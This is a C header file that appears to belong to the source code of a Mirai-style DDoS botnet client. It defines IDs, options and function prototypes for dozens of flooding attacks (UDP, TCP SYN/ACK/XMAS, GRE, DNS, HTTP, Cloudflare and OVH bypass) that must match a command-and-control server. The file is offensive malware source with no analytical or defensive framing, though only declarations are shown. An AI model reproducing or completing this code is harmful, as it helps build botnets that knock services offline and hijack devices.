#ifndef _ATTACK_H
#define _ATTACK_H

#include "includes.h"

/* ============================================================================
 * ATTACK VECTORS - Must match C&C attack.go AttackInfo.attackID values
 * ============================================================================ */
/* UDP Floods (0-19) */
#define ATK_VEC_UDP         0   /* udp */
#define ATK_VEC_UDPPLAIN    1   /* udpplain */
#define ATK_VEC_STD         2   /* std */
#define ATK_VEC_NUDP        3   /* nudp */
#define ATK_VEC_UDPHEX      4   /* udphex */
#define ATK_VEC_SOCKET_RAW  5   /* socket-raw */
#define ATK_VEC_SAMP        6   /* samp */
#define ATK_VEC_UDPSTRONG   7   /* udp-strong */
#define ATK_VEC_HEXFLD      8   /* hex-flood */
#define ATK_VEC_STRONGHEX   9   /* strong-hex */
#define ATK_VEC_OVHUDP      10  /* ovhudp */
#define ATK_VEC_CUDP        11  /* cudp */
#define ATK_VEC_ICEE        12  /* icee */
#define ATK_VEC_RANDHEX     13  /* randhex */
#define ATK_VEC_OVH         14  /* ovh */
#define ATK_VEC_OVHDROP     15  /* ovhdrop */
#define ATK_VEC_NFO         16  /* nfo */
/* Reserved 17-19 */

/* TCP Floods (20-39) */
#define ATK_VEC_TCP         20  /* tcp */
#define ATK_VEC_SYN         21  /* syn */
#define ATK_VEC_ACK         22  /* ack */
#define ATK_VEC_STOMP       23  /* stomp */
#define ATK_VEC_HEX         24  /* hex */
#define ATK_VEC_STDHEX      25  /* stdhex */
#define ATK_VEC_XMAS        26  /* xmas */
#define ATK_VEC_TCPALL      27  /* tcpall */
#define ATK_VEC_TCPFRAG     28  /* tcpfrag */
#define ATK_VEC_ASYN        29  /* asyn */
#define ATK_VEC_USYN        30  /* usyn */
#define ATK_VEC_ACKERPPS    31  /* ackerpps */
#define ATK_VEC_TCPMIX      32  /* tcp-mix */
#define ATK_VEC_TCPBYPASS   33  /* tcpbypass */
#define ATK_VEC_NFLAG       34  /* nflag */
#define ATK_VEC_OVHNUKE     35  /* ovhnuke */
#define ATK_VEC_RAW         36  /* raw */
/* Reserved 37-39 */

/* Special Attacks (40-49) */
#define ATK_VEC_VSE         40  /* vse */
#define ATK_VEC_DNS         41  /* dns */
#define ATK_VEC_GREIP       42  /* greip */
#define ATK_VEC_GREETH      43  /* greeth */
/* Reserved 44-49 */

/* HTTP/HTTPS (50-59) */
#define ATK_VEC_HTTP        50  /* http */
#define ATK_VEC_HTTPS       51  /* https */
/* Reserved 52-59 */

/* Cloudflare/Other (60+) */
#define ATK_VEC_CF          60  /* cf */

#define ATK_VEC_MAX         64

/* ============================================================================
 * ATTACK OPTIONS - Must match C&C flagInfoLookup.flagID values
 * ============================================================================ */
#define ATK_OPT_PAYLOAD_SIZE    0   /* len/size */
#define ATK_OPT_PAYLOAD_RAND    1   /* rand */
#define ATK_OPT_IP_TOS          2   /* tos */
#define ATK_OPT_IP_IDENT        3   /* ident */
#define ATK_OPT_IP_TTL          4   /* ttl */
#define ATK_OPT_IP_DF           5   /* df */
#define ATK_OPT_SPORT           6   /* sport */
#define ATK_OPT_DPORT           7   /* dport/port */
#define ATK_OPT_DOMAIN          8   /* domain */
#define ATK_OPT_DNS_HDR_ID      9   /* dhid */
/* Reserved 10 */
#define ATK_OPT_TCP_URG         11  /* urg */
#define ATK_OPT_TCP_ACK         12  /* ack */
#define ATK_OPT_TCP_PSH         13  /* psh */
#define ATK_OPT_TCP_RST         14  /* rst */
#define ATK_OPT_TCP_SYN         15  /* syn */
#define ATK_OPT_TCP_FIN         16  /* fin */
#define ATK_OPT_TCP_SEQNUM      17  /* seqnum */
#define ATK_OPT_TCP_ACKNUM      18  /* acknum */
#define ATK_OPT_GCIP            19  /* gcip */
#define ATK_OPT_HTTP_METHOD     20  /* method */
#define ATK_OPT_HTTP_POST_DATA  21  /* postdata */
#define ATK_OPT_HTTP_PATH       22  /* path */
/* Reserved 23 */
#define ATK_OPT_CONNS           24  /* conns */
#define ATK_OPT_SOURCE          25  /* source */
#define ATK_OPT_MINLEN          26  /* minlen */
#define ATK_OPT_MAXLEN          27  /* maxlen */
#define ATK_OPT_PAYLOAD         28  /* payload */
#define ATK_OPT_REPEAT          29  /* repeat */

/* ============================================================================
 * ATTACK STRUCTURES
 * ============================================================================ */
struct attack_target {
    struct in_addr addr;
    uint8_t netmask;
};

struct attack_option {
    uint8_t key;
    char *val;
};

struct attack_method {
    void (*func)(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
    uint8_t type;
};

/* ============================================================================
 * FUNCTION PROTOTYPES
 * ============================================================================ */
void attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, uint8_t, int, struct attack_target *, struct attack_option *);
char *attack_get_opt_str(int, struct attack_option *, int, uint8_t);
int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
uint32_t attack_get_opt_ip(int, struct attack_option *, int, uint8_t);

/* Attack method declarations - UDP */
static void attack_udp_generic(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_plain(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_std(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_nudp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_hex(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_socket_raw(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_samp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_strong(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_ovh(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_cudp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_icee(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_randhex(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_ovhdrop(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_nfo(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Attack method declarations - TCP */
static void attack_tcp_syn(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_ack(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_stomp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_hex(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_stdhex(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_xmas(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_all(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_frag(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_asyn(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_usyn(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_ackerpps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_mix(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_bypass(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_nflag(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_ovhnuke(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_raw(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Attack method declarations - Special */
static void attack_udp_vse(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_dns(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_ip(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_eth(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Attack method declarations - HTTP */
static void attack_http(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_https(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_cf(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

#endif
